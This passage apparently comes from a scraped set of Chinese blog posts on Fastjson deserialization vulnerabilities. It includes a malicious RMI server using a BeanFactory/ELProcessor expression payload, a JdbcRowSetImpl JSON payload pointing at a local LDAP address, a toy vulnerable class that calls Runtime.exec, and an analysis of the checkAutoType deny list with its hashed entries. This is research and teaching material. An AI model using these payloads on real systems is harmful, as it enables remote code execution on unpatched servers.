is Listening on port: 1099\");  \n Registry registry = LocateRegistry.createRegistry(1099);  \n  \n // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory  \n ResourceRef ref = new ResourceRef(\"javax.el.ELProcessor\", null, \"\", \"\",  \n true,\"org.apache.naming.factory.BeanFactory\",null);  \n  \n // 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见BeanFactory.getObjectInstance代码  \n ref.add(new StringRefAddr(\"forceString\", \"x=eval\"));  \n  \n // 利用表达式执行命令  \n ref.add(new StringRefAddr(\"x\", \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\")\" +  \n                \".newInstance().getEngineByName(\\\"JavaScript\\\")\" +  \n                \".eval(\\\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\\\")\"));  \n System.out.println(\"[*]Evil command: calc\");  \n ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);  \n registry.bind(\"Object\", referenceWrapper);  \n &#125;  \n&#125;\n\n我们的 EXP 不变。\nimport com.alibaba.fastjson.JSON;  \n  \npublic class HighJdkBypass &#123;  \n    public static void main(String[] args) &#123;  \n        String payload =\"&#123;\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"ldap://127.0.0.1:1234/ExportObject\\\",\\\"autoCommit\\\":\\\"true\\\" &#125;\";  \n JSON.parse(payload);  \n &#125;  \n&#125;\n\n值得一提的是，这个 EXP 需要 CC 链的环境，当时我这里踩了坑哈哈。\n\n\n0x06 小结先小结一下两种攻击方式，TemplatesImpl 是有一点限制的，需要对方的代码里面能够让我们加载的私有的 getter&#x2F;setter。也就是需要这个参数 Feature.SupportNonPublicField\n第二种攻击方式，需要针对 jdk 版本吧，不过平常攻击肯定是第二种用的比较多。\n0x07 参考资料Fastjson系列二——1.2.22-1.2.24反序列化漏洞 [ Mi1k7ea ]\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化Fastjson篇01-FastJson基础","url":"/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80/","content":"FastJson基础\n\nJava反序列化 Fastjson 篇 01-Fastjson 基础0x01 前言\n原本是打算尝试用一下 fastjson 开发的，但是发现教程不多，而且真正贴合进项目还是用的 jackson 多一点，就先不看具体的开发了。\n\n0x02 Fastjson 简介Fastjson 是 Alibaba 开发的 Java 语言编写的高性能 JSON 库，用于将数据在 JSON 和 Java Object 之间互相转换。\n提供两个主要接口来分别实现序列化和反序列化操作。\nJSON.toJSONString 将 Java 对象转换为 json 对象，序列化的过程。\nJSON.parseObject/JSON.parse 将 json 对象重新变回 Java 对象；反序列化的过程\n\n所以可以简单的把 json 理解成是一个字符串。\n\n0x03 代码 demo1. 序列化代码实现这里通过 Demo 了解下如何使用 Fastjson 进行序列化和反序列化，以及其中的一些特性之间的区别等等。\n首先，pom.xml 里面导入 Fastjson 的依赖，这里先导入 1.2.24 的。\n&lt;dependency>  \n &lt;groupId>com.alibaba&lt;/groupId>  \n &lt;artifactId>fastjson&lt;/artifactId>  \n &lt;version>1.2.24&lt;/version>  \n&lt;/dependency>\n\n定义一个 Student 类，代码如下Student.java\npublic class Student &#123;  \n    private String name;  \n private int age;  \n  \n public Student() &#123;  \n        System.out.println(\"构造函数\");  \n &#125;  \n  \n    public String getName() &#123;  \n        System.out.println(\"getName\");  \n return name;  \n &#125;  \n  \n    public void setName(String name) &#123;  \n        System.out.println(\"setName\");  \n this.name = name;  \n &#125;  \n  \n    public int getAge() &#123;  \n        System.out.println(\"getAge\");  \n return age;  \n &#125;  \n  \n    public void setAge(int age) &#123;  \n        System.out.println(\"setAge\");  \n this.age = age;  \n &#125;  \n&#125;\n\n然后写序列化的代码，调用 JSON.toJsonString() 来序列化 Student 类对象 ：StudentSerialize.java\nimport com.alibaba.fastjson.JSON;  \nimport com.alibaba.fastjson.serializer.SerializerFeature;  \n  \n// 最开始的序列化 demopublic class StudentSerialize &#123;  \n    public static void main(String[] args) &#123;  \n        Student student = new Student();  \n student.setName(\"Drunkbaby\");  \n//        student.setAge(6);  \n String jsonString = JSON.toJSONString(student, SerializerFeature.WriteClassName);  \n System.out.println(jsonString);  \n &#125;  \n&#125;\n\n这个地方，序列化的逻辑我们可以稍微调试看一下。\n首先会进到 JSON 这个类，然后进到它的 toJSONString() 的函数里面，new 了一个 SerializeWriter 对象。我们的序列化这一步在这里就已经是完成了。\n\n\n在进到 JSON 这个类里面的时候多出了个 static 的变量，写着 “members of JSON”，这里要特别注意一个值 DEFAULT_TYPE_KEY 为 “@type”，这个挺重要的。\n\n\n里面定义了一些初值，赋值给 out 变量，这个 out 变量后续作为 JSONSerializer 类构造的参数。\n\n\n继续往下面走，就是显示的部分了，toString() 方法，最后的运行结果。\n\n\n很明显这句语句是关键的。\nString jsonString = JSON.toJSONString(student, SerializerFeature.WriteClassName);\n\n我们关注于它的参数第一个参数是 student，是一个对象，就不多说了；第二个参数是 SerializerFeature.WriteClassName，是 JSON.toJSONString() 中的一个设置属性值，设置之后在序列化的时候会多写入一个@type，即写上被序列化的类名，type 可以指定反序列化的类，并且调用其 getter&#x2F;setter&#x2F;is 方法。\n\nFastjson 接受的 JSON 可以通过@type字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作。\n\n输出如下：\n// 设置了SerializerFeature.WriteClassName\n构造函数\nsetName\nsetAge\ngetAge\ngetName\n&#123;\"@type\":\"org.example.Student\",\"age\":6,\"name\":\"John\"&#125;\n \n// 未设置SerializerFeature.WriteClassName\n构造函数\nsetName\nsetAge\ngetAge\ngetName\n&#123;\"age\":6,\"name\":\"John\"&#125;\n\n2. 反序列化代码实现调用 JSON.parseObject()，代码如下\nStudentUnserialize01.java\nimport com.alibaba.fastjson.JSON;  \nimport com.alibaba.fastjson.parser.Feature;  \n  \npublic class StudentUnserialize &#123;  \n    public static void main(String[] args) &#123;  \n        String jsonString = \"&#123;\\\"@type\\\":\\\"Student\\\",\\\"age\\\":6,\\\"name\\\":\\\"Drunkbaby\\\"&#125;\";  \n Student student = JSON.parseObject(jsonString, Student.class, Feature.SupportNonPublicField);  \n System.out.println(student);  \n System.out.println(student.getClass().getName());  \n &#125;  \n&#125;\n\n运行结果如图\n\n\n\n至此，代码 demo 结束\n\n0x04 另外一些基础知识\nfastjson 这里还有一些比较重要的知识，我不知道该归到哪一堆里面，又不想起太多目录，就全部放到这里了。\n\n\n感觉可以先看第三点的一句话概括，再看前面两点\n\n1. 反序列化时的 Feature.SupportNonPublicField 参数前文我们在反序列化代码运行的时候，发现我们并不能获取到 “age” 这个值，因为它是私有属性的。\n\n如果要还原出 private 的属性的话，还需要在JSON.parseObject&#x2F;JSON.parse中加上Feature.SupportNonPublicField参数。\n\n这里改下Student类，将私有属性age的setAge()函数注释掉（一般没人会给私有属性加setter方法，加了就没必要声明为private了）：\n整个输出如下，我直接把加了参和没有加参的直接放一起\n&#x2F;&#x2F; 未加上参数的，会看到获取不到私有变量age的值而是被设置为0\n构造函数\nsetName\nStudent@4459eb14\nStudent\ngetName\ngetAge\nDrunkbaby 0\n\n&#x2F;&#x2F; 加上参数的了，再输出就能成功还原出age这个私有变量的值了\n构造函数\nsetName\nStudent@4459eb14\nStudent\ngetName\ngetAge\nDrunkbaby 6\n\n也就是说，若想让传给JSON.parseObject()进行反序列化的JSON内容指向的对象类中的私有变量成功还原出来，则需要在调用JSON.parseObject()时加上Feature.SupportNonPublicField这个属性设置才行。\n2. 只进行 JSON.parseObject(jsonString)再来看下parseObject()的指定或不指定反序列化类型之间的差异。\n由于Fastjson反序列化漏洞的利用只和包含了@type的JSON数据有关，因此这里我们只对序列化时设置了SerializerFeature.WriteClassName即含有@type指定反序列化类型的JSON数据进行反序列化；对于未包含@type的情况这里不做探讨，可自行测试。\n修改Student类，添加两个private成员变量，且所有的私有成员变量都不定义setter方法（既然是private也没必要定义）：\nimport java.util.Properties;  \n  \npublic class Student &#123;  \n    private String name;  \n private int age;  \n private String address;  \n private Properties properties;  \n  \n public Student() &#123;  \n        System.out.println(\"构造函数\");  \n &#125;  \n  \n    public String getName() &#123;  \n        System.out.println(\"getName\");  \n return name;  \n &#125;  \n  \n    public void setName(String name) &#123;  \n        System.out.println(\"setName\");  \n this.name = name;  \n &#125;  \n  \n    public int getAge() &#123;  \n        System.out.println(\"getAge\");  \n return age;  \n &#125;  \n  \n//    public void setAge(int age) &#123;  \n//        System.out.println(\"setAge\");  \n//        this.age = age;  \n//    &#125;  \n  \n public String getAddress() &#123;  \n        System.out.println(\"getAddress\");  \n return address;  \n &#125;  \n  \n    public Properties getProperties() &#123;  \n        System.out.println(\"getProperties\");  \n return properties;  \n &#125;  \n&#125;\n\n修改反序列化的 demo 文件，先是默认调用parseObject()不带指定类型的参数：也就是只有 JSON.parseObject(jsonstring)\n代码如下StudentUnserialize02.java\nimport com.alibaba.fastjson.JSON;  \n  \npublic class StudentUnserialize02 &#123;  \n    public static void main(String[] args) &#123;  \n        String jsonString =\"&#123;\\\"@type\\\":\\\"Student\\\",\\\"age\\\":6,\" +  \n                \"\\\"name\\\":\\\"Drunkbaby\\\",\\\"address\\\":\\\"china\\\",\\\"properties\\\":&#123;&#125;&#125;\";  \n Object obj = JSON.parseObject(jsonString);  \n // 或以下语句，输出结果一致  \n //JSONObject obj = JSON.parseObject(jsonString);  \n System.out.println(obj);  \n System.out.println(obj.getClass().getName());  \n &#125;  \n&#125;\n\n输出看到，调用了Student类的构造函数、所有属性的getter方法、JSON里面非私有属性的setter方法，其中getProperties()调用了两次；无论定义的对象是Object还是JSONObject，最后反序列化得到的都是JSONObject类对象，可以看到是未反序列化成功的：\n\n\n接着在StudentUnserialize02.java中修改反序列化代码语句如下，加上指定反序列化得到的类型为Object.class或Student.class，这样就是成功反序列化的回显。\n\n\n\n3. parse与parseObject区别前面的demo都是用parseObject()演示的，还没说到parse()。两者主要的区别就是parseObject()返回的是JSONObject而parse()返回的是实际类型的对象，当在没有对应类的定义的情况下，一般情况下都会使用JSON.parseObject()来获取数据。\n\nFastJson中的 parse() 和 parseObject() 方法都可以用来将JSON字符串反序列化成Java对象，parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()。所以进行反序列化时的细节区别在于，parse() 会识别并调用目标类的 setter 方法及某些特定条件的 getter 方法，而 parseObject() 由于多执行了 JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法。\n\n也就是说，我们用parse()反序列化会直接得到特定的类，而无需像parseObject()一样返回的是JSONObject类型的对象、还可能需要去设置第二个参数指定返回特定的类。\n修改反序列化语句中的parseObject()为parse()：\nStudentUnserialize03.java\nimport com.alibaba.fastjson.JSON;  \nimport com.alibaba.fastjson.parser.Feature;  \n  \npublic class StudentUnserialize03 &#123;  \n    public static void main(String[] args) &#123;  \n        String jsonString =\"&#123;\\\"@type\\\":\\\"Student\\\",\\\"age\\\":6,\" +  \n                \"\\\"name\\\":\\\"Drunkbaby\\\",\\\"address\\\":\\\"china\\\",\\\"properties\\\":&#123;&#125;&#125;\";  \n Object obj = JSON.parse(jsonString, Feature.SupportNonPublicField);  \n // 或以下语句，输出结果一致  \n //JSONObject obj = JSON.parseObject(jsonString);  \n System.out.println(obj);  \n System.out.println(obj.getClass().getName());  \n &#125;  \n&#125;\n\n\n4. 一句话概括 一句话概括上面两点\n这里写的有点啰嗦了，我觉得就一句话就可以概括了，我们的反序列化的语句应该这么写\nString jsonString =\"&#123;\\\"@type\\\":\\\"Student\\\",\\\"age\\\":6,\" +  \n        \"\\\"name\\\":\\\"Drunkbaby\\\",\\\"address\\\":\\\"china\\\",\\\"properties\\\":&#123;&#125;&#125;\";  \nObject obj = JSON.parseObject(jsonString, Student.class);\n\n要用 parseObject，里面的参数需要是 Object.class\n0x05 fastjson 反序列化漏洞原理\n感觉这里废话有点多，我先总结一下。\n\nfastjson 在反序列化的时候会去找我们在 @type 中规定的类是哪个类，然后在反序列化的时候会自动调用这些 setter 与 getter 方法的调用，注意！并不是所有的 setter 和 getter 方法。\n下面直接引用结论，Fastjson会对满足下列要求的setter&#x2F;getter方法进行调用：\n满足条件的setter：\n\n非静态函数\n返回类型为void或当前类\n参数个数为1个\n\n满足条件的getter：\n\n非静态方法\n无参数\n返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong\n\n我个人理解 fastjson 的利用攻击其实是蛮简单的，因为没有那么多复杂的链子，也不需要反射修改值，直接在 json 串里面赋值就好了。\n1. 漏洞原理由前面知道，Fastjson是自己实现的一套序列化和反序列化机制，不是用的Java原生的序列化和反序列化机制。无论是哪个版本，Fastjson反序列化漏洞的原理都是一样的，只不过不同版本是针对不同的黑名单或者利用不同利用链来进行绕过利用而已。\n通过Fastjson反序列化漏洞，攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行。\n那么如何才能够反序列化出恶意类呢？由前面demo知道，Fastjson使用parseObject()&#x2F;parse()进行反序列化的时候可以指定类型。如果指定的类型太大，包含太多子类，就有利用空间了。例如，如果指定类型为Object或JSONObject，则可以反序列化出来任意类。例如代码写Object o = JSON.parseObject(poc,Object.class)就可以反序列化出Object类或其任意子类，而Object又是任意类的父类，所以就可以反序列化出所有类。\n接着，如何才能触发反序列化得到的恶意类中的恶意函数呢？由前面知道，在某些情况下进行反序列化时会将反序列化得到的类的构造函数、getter方法、setter方法执行一遍，如果这三种方法中存在危险操作，则可能导致反序列化漏洞的存在。换句话说，就是攻击者传入要进行反序列化的类中的构造函数、getter方法、setter方法中要存在漏洞才能触发。\n我们到DefaultJSONParser.parseObject(Map object, Object fieldName)中看下，JSON中以@type形式传入的类的时候，调用deserializer.deserialize()处理该类，并去调用这个类的setter和getter方法：\npublic final Object parseObject(final Map object, Object fieldName) &#123;\n    ...\n    // JSON.DEFAULT_TYPE_KEY即@type\n    if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;\n        ...\n        ObjectDeserializer deserializer = config.getDeserializer(clazz);\n        return deserializer.deserialze(this, clazz, fieldName);\n\n整个解析过程相当复杂，知道结论就ok了。\n小结一下若反序列化指定类型的类如Student obj = JSON.parseObject(text, Student.class);，该类本身的构造函数、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞；\n若反序列化未指定类型的类如Object obj = JSON.parseObject(text, Object.class);，该若该类的子类的构造方法、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞；\n2. PoC 写法一般的，Fastjson反序列化漏洞的PoC写法如下，@type指定了反序列化得到的类\n&#123;\n\"@type\":\"xxx.xxx.xxx\",\n\"xxx\":\"xxx\",\n...\n&#125;\n\n关键是要找出一个特殊的在目标环境中已存在的类，满足如下两个条件：\n\n该类的构造函数、setter方法、getter方法中的某一个存在危险操作，比如造成命令执行；\n可以控制该漏洞函数的变量（一般就是该类的属性）；\n\n3. 漏洞Demo由前面比较的案例知道，当反序列化指定的类型是Object.class，即代码为Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);时，反序列化得到的类的构造函数、所有属性的setter方法、properties私有属性的getter方法都会被调用，因此我们这里直接做最简单的修改，将Student类中会被调用的getter方法添加漏洞代码，这里修改getProperties()作为演示：\nimport java.util.Properties;  \n  \npublic class Student &#123;  \n    private String name;  \n private int age;  \n private String address;  \n private Properties properties;  \n  \n public Student() &#123;  \n        System.out.println(\"构造函数\");  \n &#125;  \n  \n    public String getName() &#123;  \n        System.out.println(\"getName\");  \n return name;  \n &#125;  \n  \n    public void setName(String name) &#123;  \n        System.out.println(\"setName\");  \n this.name = name;  \n &#125;  \n  \n    public int getAge() &#123;  \n        System.out.println(\"getAge\");  \n return age;  \n &#125;  \n  \n//    public void setAge(int age) &#123;  \n//        System.out.println(\"setAge\");  \n//        this.age = age;  \n//    &#125;  \n  \n public String getAddress() &#123;  \n        System.out.println(\"getAddress\");  \n return address;  \n &#125;  \n  \n    public Properties getProperties() throws Exception&#123;  \n        System.out.println(\"getProperties\");  \n Runtime.getRuntime().exec(\"calc\");  \n return properties;  \n &#125;  \n&#125;\n\n然后在反序列化的代码当中修改如下(我这里是新建了一个文件)FastjsonEasyPoC.java\nimport com.alibaba.fastjson.JSON;  \nimport com.alibaba.fastjson.JSONObject;  \nimport com.alibaba.fastjson.parser.Feature;  \n  \npublic class FastjsonEasyPoC &#123;  \n    public static void main(String[] args)&#123;  \n        String jsonString =\"&#123;\\\"@type\\\":\\\"Student\\\",\\\"age\\\":6,\\\"name\\\":\\\"Drunkbaby\\\",\\\"address\\\":\\\"china\\\",\\\"properties\\\":&#123;&#125;&#125;\";  \n  \n Object obj = JSON.parseObject(jsonString, Object.class);  \n System.out.println(obj);  \n System.out.println(obj.getClass().getName());  \n &#125;  \n&#125;\n\n\n运行结果如图\n\n\n\n很明显，前面的Demo中反序列化的类是一个Object类，该类是任意类的父类，其子类Student存在Fastjson反序列化漏洞，当@type指向Student类是反序列化就会触发漏洞。\n对于另一种反序列化指定类的情景，是该指定类本身就存在漏洞，比如我们将上述Demo中反序列化那行代码改成直接反序列化得到Student类而非Object类，这样就是另一个触发也是最直接的触发场景：\nStudent obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);\n\n4. 调试分析漏洞\n就还是 debug 一下，看一下内部运行逻辑\n\n这个地方的命令执行\n\n\n其实也好理解吧，毕竟 fastjson 这里很简单，就和我们当初讲反序列化入门的时候差不多。\n0x06 小结总体来说入门确实不难，但是对于基础会有点要求。\n总结一下漏洞发生在反序列化的点，也就是 Obj.parse 和 Obj.parseObject 这里。必须的是传参要带入 class 的参数，最好带上 Feature.SupportNonPublicField\nPoC 是通过 String 传进去的，要以 @type 打头。\n漏洞的原因是反序列化的时候去调用了 getter 和 setter 的方法。其余就没什么了，比较简单。\n0x07 参考资料Fastjson反序列化漏洞(1)——基本原理 – JohnFrod’s Blog\nFastjson系列一——反序列化漏洞基本原理 [ Mi1k7ea ]\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化Fastjson篇03-Fastjson各版本绕过分析","url":"/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/","content":"Fastjson各版本绕过分析\n\nJava 反序列化 Fastjson 篇 03-Fastjson 各版本绕过分析\n本篇文章讲的历史补丁版本绕过的利用，都必须开启AutoTypeSupport才能成功\n\n0x01 前言我们上篇文章分析了 Fastjson 1.2.24 版本的漏洞，这篇文章主要讲一讲 1.2.25 之后版本的绕过手段。\n在讲这个之前，我们先看一看 Fastjson 的 1.2.25 版本是如何修复 1.2.24 版本的漏洞的。\n0x02 分析 Fastjson 1.2.25 版本是如何修复漏洞的checkAutoType()修补方案就是将DefaultJSONParser.parseObject()函数中的TypeUtils.loadClass替换为checkAutoType()函数：\n\n\n看下checkAutoType()函数，具体的可看注释：\npublic Class&lt;?> checkAutoType(String typeName, Class&lt;?> expectClass) &#123;\n    if (typeName == null) &#123;\n        return null;\n    &#125;\n \n    final String className = typeName.replace('$', '.');\n \n    // autoTypeSupport默认为False\n    // 当autoTypeSupport开启时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤\n    if (autoTypeSupport || expectClass != null) &#123;\n        for (int i = 0; i &lt; acceptList.length; ++i) &#123;\n            String accept = acceptList[i];\n            if (className.startsWith(accept)) &#123;\n                return TypeUtils.loadClass(typeName, defaultClassLoader);\n            &#125;\n        &#125;\n \n        for (int i = 0; i &lt; denyList.length; ++i) &#123;\n            String deny = denyList[i];\n            if (className.startsWith(deny)) &#123;\n                throw new JSONException(\"autoType is not support. \" + typeName);\n            &#125;\n        &#125;\n    &#125;\n \n    // 从Map缓存中获取类，注意这是后面版本的漏洞点\n    Class&lt;?> clazz = TypeUtils.getClassFromMapping(typeName);\n    if (clazz == null) &#123;\n        clazz = deserializers.findClass(typeName);\n    &#125;\n \n    if (clazz != null) &#123;\n        if (expectClass != null &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;\n            throw new JSONException(\"type not match. \" + typeName + \" -> \" + expectClass.getName());\n        &#125;\n \n        return clazz;\n    &#125;\n \n    // 当autoTypeSupport未开启时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错\n    if (!autoTypeSupport) &#123;\n        for (int i = 0; i &lt; denyList.length; ++i) &#123;\n            String deny = denyList[i];\n            if (className.startsWith(deny)) &#123;\n                throw new JSONException(\"autoType is not support. \" + typeName);\n            &#125;\n        &#125;\n        for (int i = 0; i &lt; acceptList.length; ++i) &#123;\n            String accept = acceptList[i];\n            if (className.startsWith(accept)) &#123;\n                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);\n \n                if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;\n                    throw new JSONException(\"type not match. \" + typeName + \" -> \" + expectClass.getName());\n                &#125;\n                return clazz;\n            &#125;\n        &#125;\n    &#125;\n \n    if (autoTypeSupport || expectClass != null) &#123;\n        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);\n    &#125;\n \n    if (clazz != null) &#123;\n \n        if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger\n            || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver\n           ) &#123;\n            throw new JSONException(\"autoType is not support. \" + typeName);\n        &#125;\n \n        if (expectClass != null) &#123;\n            if (expectClass.isAssignableFrom(clazz)) &#123;\n                return clazz;\n            &#125; else &#123;\n                throw new JSONException(\"type not match. \" + typeName + \" -> \" + expectClass.getName());\n            &#125;\n        &#125;\n    &#125;\n \n    if (!autoTypeSupport) &#123;\n        throw new JSONException(\"autoType is not support. \" + typeName);\n    &#125;\n \n    return clazz;\n&#125;\n\n简单地说，checkAutoType()函数就是使用黑白名单的方式对反序列化的类型继续过滤，acceptList为白名单（默认为空，可手动添加），denyList为黑名单（默认不为空）。\n默认情况下，autoTypeSupport为False，即先进行黑名单过滤，遍历denyList，如果引入的库以denyList中某个deny开头，就会抛出异常，中断运行。\ndenyList黑名单中列出了常见的反序列化漏洞利用链Gadgets：\nbsh\ncom.mchange\ncom.sun.\njava.lang.Thread\njava.net.Socket\njava.rmi\njavax.xml\norg.apache.bcel\norg.apache.commons.beanutils\norg.apache.commons.collections.Transformer\norg.apache.commons.collections.functors\norg.apache.commons.collections4.comparators\norg.apache.commons.fileupload\norg.apache.myfaces.context.servlet\norg.apache.tomcat\norg.apache.wicket.util\norg.codehaus.groovy.runtime\norg.hibernate\norg.jboss\norg.mozilla.javascript\norg.python.core\norg.springframework\n\n这里可以看到黑名单中包含了”com.sun.”，这就把我们前面的几个利用链都给过滤了，成功防御了。\n运行能看到报错信息，说autoType不支持该类：\n\n\n调试分析看到，就是在checkAutoType()函数中未开启autoTypeSupport即默认设置的场景下被黑名单过滤了从而导致抛出异常程序终止的：\n\n\nautoTypeSupportautoTypeSupport是checkAutoType()函数出现后ParserConfig.java中新增的一个配置选项，在checkAutoType()函数的某些代码逻辑起到开关的作用。\n默认情况下autoTypeSupport为False，将其设置为True有两种方法：\n\nJVM启动参数：-Dfastjson.parser.autoTypeSupport=true\n代码中设置：ParserConfig.getGlobalInstance().setAutoTypeSupport(true);，如果有使用非全局ParserConfig则用另外调用setAutoTypeSupport(true);\n\nAutoType白名单设置方法：\n\nJVM启动参数：-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.\n代码中设置：ParserConfig.getGlobalInstance().addAccept(&quot;com.xx.a&quot;);\n通过fastjson.properties文件配置。在1.2.25&#x2F;1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.\n\n小结补丁手段在1.2.24之后的版本中，使用了checkAutoType()函数，通过黑白名单的方式来防御Fastjson反序列化漏洞，因此后面发现的Fastjson反序列化漏洞都是针对黑名单的绕过来实现攻击利用的。\n网上一些文章讲的都是针对1.2.41、1.2.42、1.2.43、1.2.45这些特定版本的补丁绕过，其实实际上并不只是针对该特定版本，而是针对从1.2.25开始的一系列版本，自己试下就知道PoC可以打哪些范围了。\n0x03 寻找可用利用链通过对黑名单的研究，我们可以找到具体版本有哪些利用链可以利用。\n从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究，提高漏洞利用门槛，但是有人已在Github上跑出了大部分黑名单包类：https://github.com/LeadroyaL/fastjson-blacklist\n目前已知的哈希黑名单的对应表如下：\nversionhashhex-hashname1.2.42-87200464268501004970x86fc2bf9beaf7aefLorg.apache.commons.collections4.comparators1.2.42-81093007016397210880x8f75f9fa0df03f80Lorg.python.core1.2.42-79661231005031995690x9172a53f157930afLorg.apache.tomcat1.2.42-77666058188347480970x9437792831df7d3fLorg.apache.xalan1.2.42-68354370861568135360xa123a62f93178b20Ljavax.xml1.2.42-48375369718107379700xbcdd9dc12766f0ceLorg.springframework.1.2.42-40820570402351257540xc7599ebfe3e72406Lorg.apache.commons.beanutils1.2.42-23649879942476791150xdf2ddff310cdb375Lorg.apache.commons.collections.Transformer1.2.42-18724170153665881170xe603d6a51fad692bLorg.codehaus.groovy.runtime1.2.42-2546701113762471510xfc773ae20c827691Ljava.lang.Thread1.2.42-1902810656853956800xfd5bfc610056d720Ljavax.net.1.2.423138641002078975070x45b11bc78a3aba3Lcom.mchange1.2.4212032327279673086060x10b2bdca849d9b3eLorg.apache.wicket.util1.2.4215028459588739591520x14db2e6fead04af0Ljava.util.jar.1.2.4235476277816545989880x313bb4abd8d4554cLorg.mozilla.javascript1.2.4237307524322858268630x33c64b921f523f2fLjava.rmi1.2.4237943166657632660330x34a81ee78429fdf1Ljava.util.prefs.1.2.4241476967071472714080x398f942e01920cf0Lcom.sun.1.2.4253479098776336548280x4a3797b30328202cLjava.util.logging.1.2.4254504488283349214850x4ba3e254e758d70dLorg.apache.bcel1.2.4257513934395027952950x4fd10ddc6d13821fLjava.net.Socket1.2.4259441079692361555800x527db6b46ce3bcbcLorg.apache.commons.fileupload1.2.4267427054327180117800x5d92e6ddde40ed84Lorg.jboss1.2.4271793369283658894650x63a220e60a17c7b9Lorg.hibernate1.2.4274426242568605493300x6749835432e0f0d2Lorg.apache.commons.collections.functors1.2.4288382947100984353150x7aa7ee3627a19cf3Lorg.apache.myfaces.context.servlet1.2.43-22622447606199520810xe09ae4604842582fLjava.net.URL1.2.46-81656373983507076450x8eadd40cb2a94443Ljunit.1.2.46-80835148884603758840x8fd1960988bce8b4Lorg.apache.ibatis.datasource1.2.46-79212188309982864080x92122d710e364fb8Lorg.osjava.sj.1.2.46-77686080374581852750x94305c26580f73c5Lorg.apache.log4j.1.2.46-61795896095504933850xaa3daffdb10c4937Lorg.logicalcobwebs.1.2.46-51946410812681042860xb7e8ed757f5d13a2Lorg.apache.logging.1.2.46-39351858548757333620xc963695082fd728eLorg.apache.commons.dbcp1.2.46-27534278444007762710xd9c9dbf6bbd27bb1Lcom.ibatis.sqlmap.engine.datasource1.2.46-15891948802142351290xe9f20bad25f60807Lorg.jdom.1.2.4610736347393082897760xee6511b66fd5ef0Lorg.slf4j.1.2.4656882008837517983890x4ef08c90ff16c675Ljavassist.1.2.4670174921631085942700x616323f12c2ce25eLoracle.net1.2.4683890325370952473550x746bd4a53ec195fbLorg.jaxen.1.2.4814598608459348176240x144277b467723158Ljava.net.InetAddress1.2.4884096407690195891190x74b50bb9260e31ffLjava.lang.Class1.2.4949040078171886304570x440e89208f445fb9Lcom.alibaba.fastjson.annotation1.2.5951003360815100803430x46c808a4b5841f57Lorg.apache.cxf.jaxrs.provider.1.2.5964568557234741969080x599b5c1213a099acLch.qos.logback.1.2.5985372332572834526550x767a586a5107feefLnet.sf.ehcache.transaction.manager.1.2.6036881790727221092000x332f0b5369a18310Lcom.zaxxer.hikari.1.2.61-44013908040443773350xc2eb1e621f439309Lflex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor1.2.61-16504858149830271580xe9184be55b1d962aLorg.apache.openjpa.ee.1.2.61-12514191541766208310xeea210e8da2ec6e1Loracle.jdbc.rowset.OracleJDBCRowSet1.2.61-98224830678824910xffdd1a80f1ed3405Lcom.mysql.cj.jdbc.admin.1.2.61991470921420562800x1603dc147a3e358Loracle.jdbc.connector.OracleManagedConnectionFactory1.2.6131148628681176055990x2b3a37467a344cdfLorg.apache.ibatis.parsing.1.2.6148146584335701759130x42d11a560fc9fba9Lorg.apache.axis2.jaxws.spi.handler.1.2.6165110355760632542700x5a5bd85c072e5efeLjodd.db.connection.1.2.6189255224615796471740x7bddd363ad3998c6Lorg.apache.commons.configuration.JNDIConfiguration1.2.62-91646063882146995180x80d0c70bcc2fea02Lorg.apache.ibatis.executor.1.2.62-86499612137098967940x87f52a1b07ea33a6Lnet.sf.cglib.1.2.62-57648047920632168190xafff4c95b99a334dLcom.mysql.cj.jdbc.MysqlDataSource1.2.62-44387756801850741000xc2664d0958ecfe4cLaj.org.objectweb.asm.1.2.62-33192079494866910200xd1efcdf4b3316d34Loracle.jdbc.1.2.62-21928043970193473130xe1919804d5bf468fLorg.apache.commons.collections.comparators.1.2.62-20955165713888526100xe2eb3ac7e56c467eLnet.sf.ehcache.hibernate.1.2.6247503360585743090x10e067cd55c5e5Lcom.mysql.cj.log.1.2.622185129929475363120x3085068cb7201b8Lorg.h2.jdbcx.1.2.628236410664736099500xb6e292fa5955adeLorg.apache.commons.logging.1.2